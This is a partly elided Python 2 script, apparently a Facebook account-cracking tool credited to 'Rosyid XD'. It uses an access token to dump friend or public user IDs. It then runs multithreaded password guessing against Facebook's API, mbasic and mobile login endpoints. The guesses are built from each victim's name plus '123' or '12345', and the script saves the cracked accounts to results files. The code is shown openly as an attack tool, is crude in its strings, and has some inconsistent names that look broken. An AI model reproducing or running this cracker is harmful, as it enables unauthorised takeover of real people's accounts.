...
# coding=utf-8
# Coded By Rosyid XD
# My Facebook (https://www.facebook.com/paitonguchuu.uchuu)
...
from concurrent.futures import ThreadPoolExecutor as rosyidGanteng
...
#------------------------------->
koh = '100004986947878'
xi_jimpinx = '2043715872471291'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lu mau jadi Pacar gua:v', 'Never surrentod tekentod kentod:v'])
...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By RosyidXD
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Rosyid-XD
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| https://www.facebook.com/paitonguchuu.uchuu'''

lo_ngentod = '2043715872471291'
# crack selesai
def hasil(ok,cp):
...
def rosyidxd():
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);Rosyidxd()
...
def rosyid_gans():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');rosyidxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');Rosyidxd()
    ...
    os.system('clear')
    print logo
    IP = requests.get('https://www.Rosyidxd.my.id/server/ip/').text
    ...
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_Rosyid()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
        ...
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_Rosyid()
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_Rosyid()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_Rosyid()
'''
...
def info_tools():
    ...
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/Rosyidxd_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Website  : https://www.Rosyidxd.my.id'%(N,H,N);time.sleep(0.07)
...
def seting_yntkts():
    ...
    if ytbjts == '':
        ...
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_Rosyid()
    else:
...
def yo_ndak_tau_ko_tanya_saia():
    ...
    if _asu_ == '':
        ...
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.Rosyidxd.my.id/server')
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_Rosyid()
        ___Rosyidganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___Rosyidganteng___ in ('Y', 'y'):
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with YayanGanteng(max_workers=30) as (__RosyidXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __RosyidXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__RosyidXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __RosyidXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__RosyidXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __RosyidXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
                    ...
                    __yan__(pwek.split(','))
                    break
        elif ___Rosyidganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
    ...
    def __pler__(self):
        ...
        if yan == '':
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __RosyidXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with RosyidGanteng(max_workers=30) as (__rosyidXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __RosyidXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __rosyidXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
